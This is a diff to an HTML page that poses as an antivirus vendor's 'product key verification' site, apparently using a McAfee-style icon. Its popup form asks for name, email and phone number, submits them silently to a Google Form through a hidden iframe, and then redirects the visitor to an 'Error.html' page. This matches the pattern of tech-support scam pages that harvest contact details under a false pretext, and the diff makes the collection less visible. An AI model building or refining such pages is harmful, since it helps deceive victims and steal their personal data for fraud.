@@ -4,10 +4,12 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
     <title>Antivirus, Mobile Security | SecureSoftware</title>
     <link rel="icon" href="https://securesoftware.online/wp-content/uploads/2022/08/cropped-mcafee-7875-1-32x32.png" sizes="32x32" />
     <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
 </head>
 <body>
     <div class="container">
@@ -37,31 +39,35 @@
      <div class="overlay" id="overlay"></div>
 
     <div class="form-popup" id="myForm">
-        <form id="form_data" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSf_nV3Zx6C6Qn2LLXVAL1fZfmorj-0bdEZWNsZuuRRcXdO0jg/formResponse" method="post" class="form-container" autocomplete="on">
-            <h2 id="popup-heading">Please fill out the details below to verify your product key</h2>
-            <input type="text" id="entry.2005620554" class="input et_contact_error" name="entry.2005620554" required placeholder="Name" pattern="[A-Z|a-z|\s-]*" title="Only letters allowed.">
-            <input type="email" id="entry.1045781291" class="input et_contact_error" name="entry.1045781291" required placeholder="Email">
-            <input type="tel" id="entry.1166974658" class="input et_contact_error" name="entry.1166974658" required placeholder="Phone Number" pattern="[0-9]{10,10}" title="Only numbers allowed. Minimum length: 10 characters. Maximum length: 10 characters." maxlength="10">
-            <button onclick="window.open('Error.html', '_self')" type="submit" class="btn">Submit</button>
-        </form>
+        <!-- Hidden iframe for background submission -->
+<iframe name="hidden_iframe" style="display:none;"></iframe>
+
+<form id="form_data" action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSc9Ol1gHfwaC5vtFFPYO3rRTkedQMBoo10uSVFd-kacs9NpQg/formResponse" 
+      method="post" 
+      class="form-container" 
+      autocomplete="on" 
+      target="hidden_iframe" 
+      onsubmit="redirectAfterSubmit()">
+      
+    <h2 id="popup-heading">Please fill out the details below to verify your product key</h2>
+    <input type="text" id="name" class="input et_contact_error" name="entry.384022412" required placeholder="Name" pattern="[A-Za-z\s-]*" title="Only letters, spaces, and hyphens are allowed.">
+    <input type="email" id="email" class="input et_contact_error" name="entry.250265365" required placeholder="Email">
+    <input type="tel" id="phone" class="input et_contact_error" name="entry.1598428091" required placeholder="Phone Number" pattern="(\+91)?[0-9]{10}" title="Enter a valid 10-digit phone number, optionally starting with +91." maxlength="13">
+    <button type="submit" class="btn">Submit</button>
+</form>
     </div>
 
     <script>
         function openForm() {
             document.getElementById("overlay").style.display = "block";
             document.getElementById("myForm").style.display = "block";
-        }
+        } // To Open Form
 
-        var form = document.getElementById('form_data');
-        form.addEventListener("submit", function(e) {
-            e.preventDefault();
-            fetch(form.action, {
-                method: "POST",
-                body: new FormData(form),
-            }).then(response => {
-                window.open('https://securesoftware.online/?page_id=14', '_self');
-            });
-        });
+        function redirectAfterSubmit() {
+        setTimeout(function() {
+            window.location.href = "Error.html"; // Replace with your desired URL
+        }, 500); // Adjust delay as needed
+    };
     </script>
 </body>
 </html>
